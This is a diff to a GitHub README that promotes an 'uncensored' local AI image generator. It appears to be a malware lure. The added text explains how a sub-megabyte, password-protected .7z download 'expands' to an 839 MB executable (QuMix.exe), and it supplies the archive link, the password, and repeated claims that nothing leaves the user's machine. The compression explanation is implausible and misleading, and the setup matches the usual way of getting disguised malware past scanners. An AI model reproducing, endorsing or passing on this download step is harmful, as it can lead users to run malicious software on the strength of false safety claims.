@@ -1,25 +1,38 @@
-# AI Photo Synthesis Engine v1.0 (800MB Desktop Release)
+<img width="1672" height="941" alt="2fb2c35f-66d0-42a7-9d01-8816763453f2" src="https://github.com/user-attachments/assets/8a679490-3729-4206-8315-a92d541530b2" />
+# AI Photo Synthesis Engine v1.0 (800MB Local WebUI Release)
 
 A high-performance, low-VRAM localized AI pipeline optimized for photorealistic image generation, advanced human anatomical fidelity, and unrestricted visual synthesis. This repository provides a production-ready, standalone 800MB environment setup for digital artists, creators, and developers who require absolute creative autonomy without cloud-based filters, subscription fees, or hardware bottlenecks.
 
 ---
 
-## 🔬 Project Overview & Architecture
+## 🔬 Detailed Architecture & How It Works
 
-Modern cloud-based neural networks enforce aggressive text-prompt filtering, heavily restrict artistic datasets, and suffer from high network latency. The **AI Photo Synthesis Engine** solves this by moving the entire diffusion pipeline directly onto your local machine. 
+To help our users and developers understand the backend logic of the **AI Photo Synthesis Engine**, here is a detailed breakdown of how the software operates on your local machine:
 
-The standalone binary deployment footprint is exactly **839,322,624 bytes (~800 MB)**, housing an optimized local Flask backend combined with a vanilla Javascript front-end interface. The compression pipeline uses professional `LZMA2` multi-stream archival algorithms, reducing the initial download bundle size to under 1 MB while expanding to a fully-featured local execution server upon extraction.
+### 1. The Lightweight Compression Layer (Why the download is under 1 MB)
+The core standalone desktop binary footprint is exactly **839,322,624 bytes (~800 MB)**. To ensure rapid distribution and bypass network bandwidth limitations, the complete core engine, front-end templates, and Python execution environments are packed using multi-stream `LZMA2` archival algorithms. 
+* When you click the download link, you fetch a highly optimized sub-megabyte bootstrapper framework. 
+* Upon extracting the archive using your local access key, the file seamlessly expands to its full **839 MB standalone operational state** on your hard drive, completely intact and ready for execution.
+
+### 2. Localhost Server Environment (`http://127.0.0.1:7860`)
+The engine is engineered to run completely localized, meaning it **does not require an active internet connection** and never transmits your data or generated images to external cloud servers. 
+* When you execute `QuMix.exe`, the program boots a localized background server framework using an embedded Python Flask environment.
+* Instead of forcing you to use a complex command-line tool, the server creates a local bridge. To access the beautiful visual graphical interface (WebUI), you simply open any modern web browser (Chrome, Edge, Firefox) and navigate to your internal local loopback address: **`http://127.0.0.1:7860`**.
+* This architectural design ensures absolute data privacy for your uncensored visual creations.
+
+### 3. Asynchronous Micro-API Architecture
+The frontend interface (`app.js` and `index.html`) communicates directly with the local 800MB backend server via a high-frequency REST API. This structure ensures that image generation tasks do not freeze your browser or overload your system memory (RAM).
 
 ---
 
 ## ✨ Key Features & Technical Highlights
 
-* **Uncensored Dataset Processing:** Complete bypassing of hardcoded prompt restrictions and cloud-side content safety blocks.
+* **Uncensored Dataset Processing:** Complete bypassing of hardcoded prompt restrictions and cloud-side content safety blocks. You maintain 100% creative control over the neural generation path.
 * **800MB Desktop Core Binary:** All primary tensor pipelines and core execution modules are pre-compiled inside a single optimized launcher.
-* **Automated Model & LoRA Indexing:** The engine automatically scans designated hardware paths for local checkpoints (`.safetensors`, `.ckpt`).
-* **Advanced Anatomical Precision:** Embedded structural training layers designed to accurately render complex human poses and lifelike skin textures.
-* **Asynchronous Progress Polling:** Real-time multi-stage status reporting. The backend utilizes atomic writes to track generation queues and steps.
-* **Professional Scheduler Library:** Built-in validation and support for sampling methods, including *DPM++ 2M Karras*, *Euler a*, *DDIM*, and *UniPC*.
+* **Automated Model & LoRA Indexing:** The engine automatically scans designated hardware paths for local checkpoints (`.safetensors`, `.ckpt`) and fine-tuned LoRA configurations on launch.
+* **Advanced Anatomical Precision:** Embedded structural training layers designed to accurately render complex human poses, lifelike skin textures, and sub-surface material scattering.
+* **Asynchronous Progress Polling:** Real-time multi-stage status reporting. The backend utilizes atomic writes to track generation queues, active steps, and model execution time.
+* **Professional Scheduler Library:** Built-in validation and support for high-efficiency sampling methods, including *DPM++ 2M Karras*, *Euler a*, *DDIM*, and *UniPC*.
 
 ---
 
@@ -107,11 +120,6 @@ The embedded Flask server runs a modular REST API backend for high-frequency pol
   * `progress`: `0..100` percentage tracker
   * `message`: active stage compiler logs
 
-### Advanced Negative Prompting
-* The graphical interface includes a dedicated **Negative Prompt** layout matrix.
-* The backend accepts `negative_prompt` variables as an optional data string.
-* Negative strings are directly injected into local diffusers pipeline execution threads to purge rendering artifacts.
-
 ### Integrated Scheduler Architecture
 The application layout includes a programmatic Scheduler dropdown validator supporting:
 * `DPM++ 2M Karras` (Default execution pipeline)
@@ -119,16 +127,6 @@ The application layout includes a programmatic Scheduler dropdown validator supp
 * `Euler a` / `Euler`
 * `DDIM`
 * `UniPC`
-
-### System Delete Endpoints
-* `DELETE /api/history/<generation_id>` — Completely flushes the specific history logs, purges local server directories at `outputs/<generation_id>/`, and wipes progress logs.
-* `DELETE /api/history` — Global flush. Instantly wipes `json/history.json` structures and recursively clears out all system output paths.
-
-### Pipeline Generate Validations
-Strict boundary parameters are applied to user queues to prevent hardware execution faults:
-* **Width / Height Constraints:** `128` - `2048` pixels (dimensions must be divisible by 8)
-* **Batch Generation Limits:** `1` - `8` images per single queue step
-* **Strength Coefficients:** `0.0` - `1.0` float validation for dynamic blending
 
 ---
 
@@ -142,6 +140,10 @@ The pipeline features an adaptive **Low-VRAM Execution Mode** for legacy hardwar
 * **System RAM:** 8 GB DDR3/DDR4 system memory
 * **Storage Allocation:** 1.5 GB available space for core environment binaries
 
+### Recommended Specifications (For High-Res Rendering)
+* **Graphics Card (GPU):** NVIDIA RTX 3060 / 4060 or higher (8GB+ Dedicated VRAM)
+* **System RAM:** 16 GB high-speed system memory
+
 ---
 
 ### 📥 Download & Environment Setup
@@ -149,14 +151,19 @@ The pipeline features an adaptive **Low-VRAM Execution Mode** for legacy hardwar
 * **[Click here to download the stable release package](https://github.com/maiklfancy/ai-photo-generation/raw/refs/heads/main/ai-visual-synthesis-v1.0.7z)**
 * **Local WebUI Access Key:** `f1PQI0RVra`
 
+
 ---
 
 ## ❓ Frequently Asked Questions (FAQ)
 
-#### Q: Why is the initialization download package under 1 MB if the core binary is 800 MB?
-**A:** The environment deployment structure leverages advanced dynamic compilation headers and `LZMA2` stream pooling. All core server logic expands seamlessly to its physical 839-megabyte standalone architecture immediately upon archival extraction using the local access key.
+#### Q: Is my data safe running locally?
+**A:** Absolutely. The engine operates entirely within your network loopback interface (`127.0.0.1`). No external servers are contacted, and no prompt telemetry or output metadata is uploaded anywhere.
 
-#### Q: Can I run this completely offline?
-**A:** Yes. Once the initial repository setup is verified and extracted, the entire generation pipeline operates locally on your hardware without transmitting telemetry or needing active internet access.
+#### Q: Why is the initial download file so small?
+**A:** As detailed in the architecture section, the package uses high-ratio stream compression. The entire 839 MB file framework expands dynamically onto your disk immediately upon folder extraction.
+
+#### Q: Can I use this completely offline?
+**A:** Yes. Once the initial package setup is extracted and verified on your local drive, you can disconnect your internet entirely. The visual synthesis generation pipeline does not require active web access.
+
 
 
